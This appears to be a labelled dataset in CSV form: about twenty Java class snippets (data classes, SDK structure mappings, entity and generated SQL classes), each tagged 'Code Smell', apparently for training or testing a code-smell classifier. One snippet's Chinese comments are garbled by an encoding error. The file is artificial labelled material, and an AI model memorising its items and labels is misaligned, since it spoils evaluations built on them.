text,label,text_label
"@JSONType(deserializeFeatures=JSONReader.Feature.SupportSmartMatch) public class LongValueField10 {
  public long v0000;
  public long v0001;
  public long v0002;
  public long v0003;
  public long v0004;
  public long v0005;
  public long v0006;
  public long v0007;
  public long v0008;
  public long v0009;
}",1,Code Smell
"public static class EM_TROUSERS_TYPE extends SdkStructure {
  public static final int EM_TROUSERS_TYPE_UNKNOWN=0;
  public static final int EM_TROUSERS_TYPE_TROUSERS=1;
  public static final int EM_TROUSERS_TYPE_SHORTS=2;
  public static final int EM_TROUSERS_TYPE_SKIRT=3;
}",1,Code Smell
"public static class NET_DVR_ARRAY_INFO extends Structure {
  public short wArrayID;
  public byte byRaidMode;
  public byte byStatus;
  public int dwHCapacity;
  public int dwLCapacity;
  public int dwHFreeSpace;
  public int dwLFreeSpace;
  public byte[] byArrayName=new byte[MAX_NAMELEN];
  public byte byPDCount;
  public byte bySpareCount;
  public byte[] byRes1=new byte[2];
  public short[] wPDSlots=new short[SUPPORT_PD_NUM];
  public short[] wSparePDSlots=new short[SUPPORT_PD_NUM];
  public NET_DVR_BGA_INFO struBgaInfo;
  public short[] wPDSlotsPartTwo=new short[SUPPORT_PD_NUM_PARTTWO];
  public short[] wSparePDSlotsPartTwo=new short[SUPPORT_PD_NUM_PARTTWO];
  public byte[] byRes2=new byte[48];
}",1,Code Smell
"@Table(""tb_account"") public class TenantAccount {
  @Id(keyType=KeyType.Auto) private Long id;
  @ColumnMask(Masks.CHINESE_NAME) private String userName;
  private int age;
  private Date birthday;
  @Column(tenantId=true) private Long tenantId;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getUserName(){
    return userName;
  }
  public void setUserName(  String userName){
    this.userName=userName;
  }
  public int getAge(){
    return age;
  }
  public void setAge(  int age){
    this.age=age;
  }
  public Date getBirthday(){
    return birthday;
  }
  public void setBirthday(  Date birthday){
    this.birthday=birthday;
  }
  public Long getTenantId(){
    return tenantId;
  }
  public void setTenantId(  Long tenantId){
    this.tenantId=tenantId;
  }
  @Override public String toString(){
    return ""TenantAccount{"" + ""id="" + id + "", userName='""+ userName+ '\''+ "", age=""+ age+ "", birthday=""+ birthday+ "", tenantId=""+ tenantId+ '}';
  }
}
",1,Code Smell
"public final class VASMsgFont {
  Integer diyFontCfgUpdateTime;
  Integer diyFontImageId;
  Integer fontId;
  Integer magicFontType;
  Long subFontId;
  public VASMsgFont(){
  }
  public Integer getDiyFontCfgUpdateTime(){
    return this.diyFontCfgUpdateTime;
  }
  public Integer getDiyFontImageId(){
    return this.diyFontImageId;
  }
  public Integer getFontId(){
    return this.fontId;
  }
  public Integer getMagicFontType(){
    return this.magicFontType;
  }
  public Long getSubFontId(){
    return this.subFontId;
  }
  public String toString(){
    return ""VASMsgFont{fontId="" + this.fontId + "",subFontId=""+ this.subFontId+ "",diyFontCfgUpdateTime=""+ this.diyFontCfgUpdateTime+ "",diyFontImageId=""+ this.diyFontImageId+ "",magicFontType=""+ this.magicFontType+ "",}"";
  }
  public VASMsgFont(  Integer num,  Long l2,  Integer num2,  Integer num3,  Integer num4){
    this.fontId=num;
    this.subFontId=l2;
    this.diyFontCfgUpdateTime=num2;
    this.diyFontImageId=num3;
    this.magicFontType=num4;
  }
}",1,Code Smell
"/** 
 * 杞挱鍥�
 * @author YXF
 * @date 2020-11-24 16:38:32
 */
public class IndexImg extends BaseModel implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 涓婚敭
 */
  private Long imgId;
  /** 
 * 搴楅摵ID
 */
  private Long shopId;
  /** 
 * 鍥剧墖
 */
  private String imgUrl;
  /** 
 * 鐘舵��
 */
  private Integer status;
  /** 
 * 椤哄簭
 */
  private Integer seq;
  /** 
 * 鍏宠仈鍟嗗搧id
 */
  private Long spuId;
  /** 
 * 鍥剧墖绫诲瀷 0:灏忕▼搴� 1:pc
 */
  private Integer imgType;
  public Long getImgId(){
    return imgId;
  }
  public void setImgId(  Long imgId){
    this.imgId=imgId;
  }
  public Long getShopId(){
    return shopId;
  }
  public void setShopId(  Long shopId){
    this.shopId=shopId;
  }
  public String getImgUrl(){
    return imgUrl;
  }
  public void setImgUrl(  String imgUrl){
    this.imgUrl=imgUrl;
  }
  public Integer getStatus(){
    return status;
  }
  public void setStatus(  Integer status){
    this.status=status;
  }
  public Integer getSeq(){
    return seq;
  }
  public void setSeq(  Integer seq){
    this.seq=seq;
  }
  public Long getSpuId(){
    return spuId;
  }
  public void setSpuId(  Long spuId){
    this.spuId=spuId;
  }
  public Integer getImgType(){
    return imgType;
  }
  public void setImgType(  Integer imgType){
    this.imgType=imgType;
  }
  @Override public String toString(){
    return ""IndexImg{"" + ""imgId="" + imgId + "",shopId=""+ shopId+ "",imgUrl=""+ imgUrl+ "",status=""+ status+ "",seq=""+ seq+ "",spuId=""+ spuId+ "",imgType=""+ imgType+ "",createTime=""+ createTime+ "",updateTime=""+ updateTime+ '}';
  }
}",1,Code Smell
"public class BaseEntity implements Serializable {
  @TableId(value=""id"",type=IdType.AUTO) private Long id=0L;
  @TableField(value=""gmt_create"",fill=FieldFill.INSERT) private Timestamp gmtCreate;
  @TableField(fill=FieldFill.INSERT_UPDATE,update=""now()"",value=""gmt_modified"") private Timestamp gmtModified;
  private Integer isDeleted=0;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Timestamp getGmtCreate(){
    return gmtCreate;
  }
  public void setGmtCreate(  Timestamp gmtCreate){
    this.gmtCreate=gmtCreate;
  }
  public Timestamp getGmtModified(){
    return gmtModified;
  }
  public void setGmtModified(  Timestamp gmtModified){
    this.gmtModified=gmtModified;
  }
  public Integer getIsDeleted(){
    return isDeleted;
  }
  public void setIsDeleted(  Integer isDeleted){
    this.isDeleted=isDeleted;
  }
}",1,Code Smell
"public static class NET_SATELLITE_STATUS extends SdkStructure {
  public int bUsed;
  public int nID;
  public int nElevation;
  public int nDireciton;
  public int nSNR;
}
",1,Code Smell
"@JsonInclude(Include.NON_NULL) public class KafkaRecord {
  private String topic;
  private Integer partition;
  private Long timestamp;
  private TimestampType timestampType;
  private Long offset;
  private String key;
  private String value;
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public Integer getPartition(){
    return partition;
  }
  public void setPartition(  Integer partition){
    this.partition=partition;
  }
  public Long getTimestamp(){
    return timestamp;
  }
  public void setTimestamp(  Long timestamp){
    this.timestamp=timestamp;
  }
  public TimestampType getTimestampType(){
    return timestampType;
  }
  public void setTimestampType(  TimestampType timestampType){
    this.timestampType=timestampType;
  }
  public Long getOffset(){
    return offset;
  }
  public void setOffset(  Long offset){
    this.offset=offset;
  }
  public String getKey(){
    return key;
  }
  public void setKey(  String key){
    this.key=key;
  }
  public String getValue(){
    return value;
  }
  public void setValue(  String value){
    this.value=value;
  }
}
",1,Code Smell
"public class CVE {
  @SerializedName(""CVE_data_meta"") private CveMetaData cveMetaData;
  @Expose private References references;
  @Expose private Description description;
  @SerializedName(""problemtype"") private ProblemType problemType;
  public References getReferences(){
    return this.references;
  }
  public Description getDescription(){
    return this.description;
  }
  public ProblemType getProblemType(){
    return this.problemType;
  }
  public CveMetaData getCveMetaData(){
    return this.cveMetaData;
  }
}
",1,Code Smell
"private static class MessageContext {
  public final TGMessage message;
  public final Object tag;
  public final TdApi.ChatMember messageSender;
  public final boolean disableMetadata;
  public MessageContext(  TGMessage message){
    this(message,null,null,false);
  }
  public MessageContext(  TGMessage message,  Object tag,  TdApi.ChatMember messageSender,  boolean disableMetadata){
    this.message=message;
    this.tag=tag;
    this.messageSender=messageSender;
    this.disableMetadata=disableMetadata;
  }
}
",1,Code Smell
"/** 
 * @author vainhope
 */
public class RenderCondition {
  private String key;
  private int value;
  private String renderKind;
  public void setKey(  String key){
    this.key=key;
  }
  public String getKey(){
    return key;
  }
  public void setValue(  int value){
    this.value=value;
  }
  public int getValue(){
    return value;
  }
  public void setRenderKind(  String renderKind){
    this.renderKind=renderKind;
  }
  public String getRenderKind(){
    return renderKind;
  }
}
",1,Code Smell
"/** 
 * harris
 */
public class K8sResource {
  private List<Node> children;
  private String name;
  private String k8sId;
  public List<Node> getChildren(){
    return children;
  }
  public void setChildren(  List<Node> children){
    this.children=children;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getK8sId(){
    return k8sId;
  }
  public void setK8sId(  String k8sId){
    this.k8sId=k8sId;
  }
}",1,Code Smell
"static class Model<T> {
  private String name;
  @JSONField(serializeUsing=MyCodec.class,deserializeUsing=MyCodec.class) private T properties;
  Model(){
  }
  Model(  String name,  T properties){
    this.name=name;
    this.properties=properties;
  }
  public String getName(){
    return this.name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public T getProperties(){
    return this.properties;
  }
  public void setProperties(  T properties){
    this.properties=properties;
  }
}
",1,Code Smell
"public static class TcpHealthParams implements HealthParams {
  private int max=5000;
  private int min=1000;
  private float factor=0.75F;
  @Override public int getMax(){
    return max;
  }
  @Override public int getMin(){
    return min;
  }
  @Override public float getFactor(){
    return factor;
  }
  public void setFactor(  float factor){
    this.factor=factor;
  }
  public void setMax(  int max){
    this.max=max;
  }
  public void setMin(  int min){
    this.min=min;
  }
}",1,Code Smell
"public static class NET_ITC_LANE_HVT_PARAM extends Structure {
  public byte byLaneNO;
  public byte bySignSpeed;
  public byte bySpeedLimit;
  public byte byBigCarSignSpeed;
  public byte byBigCarSpeedLimit;
  public byte bySpeedCapEn;
  public byte byCaptureCount;
  public byte byRelatedIOOut;
  public byte byFlashMode;
  public byte byEnableRadar;
  public byte byChangeLaneEnable;
  public byte byChangeLaneCapNo;
  public int dwCapTarget;
  public NET_ITC_INTERVAL_PARAM struInterval;
  public byte[] byRes3=new byte[24];
  public NET_ITC_LANE_LOGIC_PARAM struLane;
  public NET_ITC_LINE struLeftLaneLine;
  public NET_ITC_LINE struRightLaneLine;
  public NET_ITC_POLYGON struPlateRecog;
  public NET_ITC_POLYGON struTraceArea;
  public NET_VCA_LINE struForwardTrigLine;
  public NET_VCA_LINE struBackwardTrigLine;
  public NET_VCA_LINE struLeftTrigLine;
  public NET_VCA_LINE struRightTrigLine;
  public byte[] byRes4=new byte[60];
}",1,Code Smell
"public static class NET_OUT_GET_ALL_PROGRAMMEPLANS extends SdkStructure {
  public int dwSize;
  public int nMaxPlanCnt;
  public int nRetImmCnt;
  public Pointer pstImmePlan;
  public int nRetTimerCnt;
  public Pointer pstTimerPlan;
  public NET_OUT_GET_ALL_PROGRAMMEPLANS(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class EM_FEATURE_ERROR_CODE {
  public final static int EM_FEATURE_ERROR_SUCCESS=0;
  public final static int EM_FEATURE_ERROR_UNKNOWN=1;
  public final static int EM_FEATURE_ERROR_IMAGE_FORMAT_ERROR=2;
  public final static int EM_FEATURE_ERROR_NOFACE_OR_NOTCLEAR=3;
  public final static int EM_FEATURE_ERROR_MULT_FACES=4;
  public final static int EM_FEATURE_ERROR_IMAGH_DECODE_FAILED=5;
  public final static int EM_FEATURE_ERROR_NOT_SUGGEST_STORAGE=6;
  public final static int EM_FEATURE_ERROR_DATABASE_OPERATE_FAILED=7;
  public final static int EM_FEATURE_ERROR_GET_IMAGE_FAILED=8;
  public final static int EM_FEATURE_ERROR_SYSTEM_EXCEPTION=9;
}",1,Code Smell
"public class AtomicIntegerArray3 {
  private AtomicIntegerArray v0000;
  private AtomicIntegerArray v0001;
  private AtomicIntegerArray v0002;
  public AtomicIntegerArray getV0000(){
    return v0000;
  }
  public void setV0000(  AtomicIntegerArray v0000){
    this.v0000=v0000;
  }
  public AtomicIntegerArray getV0001(){
    return v0001;
  }
  public void setV0001(  AtomicIntegerArray v0001){
    this.v0001=v0001;
  }
  public AtomicIntegerArray getV0002(){
    return v0002;
  }
  public void setV0002(  AtomicIntegerArray v0002){
    this.v0002=v0002;
  }
}",1,Code Smell
"public final class AuthorIncomeDetailDynamicSqlSupport {
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final AuthorIncomeDetail authorIncomeDetail=new AuthorIncomeDetail();
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> id=authorIncomeDetail.id;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> userId=authorIncomeDetail.userId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> authorId=authorIncomeDetail.authorId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Long> bookId=authorIncomeDetail.bookId;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> incomeDate=authorIncomeDetail.incomeDate;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeAccount=authorIncomeDetail.incomeAccount;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeCount=authorIncomeDetail.incomeCount;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Integer> incomeNumber=authorIncomeDetail.incomeNumber;
  @Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final SqlColumn<Date> createTime=authorIncomeDetail.createTime;
@Generated(""org.mybatis.generator.api.MyBatisGenerator"") public static final class AuthorIncomeDetail extends SqlTable {
    public final SqlColumn<Long> id=column(""id"",JDBCType.BIGINT);
    public final SqlColumn<Long> userId=column(""user_id"",JDBCType.BIGINT);
    public final SqlColumn<Long> authorId=column(""author_id"",JDBCType.BIGINT);
    public final SqlColumn<Long> bookId=column(""book_id"",JDBCType.BIGINT);
    public final SqlColumn<Date> incomeDate=column(""income_date"",JDBCType.DATE);
    public final SqlColumn<Integer> incomeAccount=column(""income_account"",JDBCType.INTEGER);
    public final SqlColumn<Integer> incomeCount=column(""income_count"",JDBCType.INTEGER);
    public final SqlColumn<Integer> incomeNumber=column(""income_number"",JDBCType.INTEGER);
    public final SqlColumn<Date> createTime=column(""create_time"",JDBCType.TIMESTAMP);
    public AuthorIncomeDetail(){
      super(""author_income_detail"");
    }
  }
}
",1,Code Smell
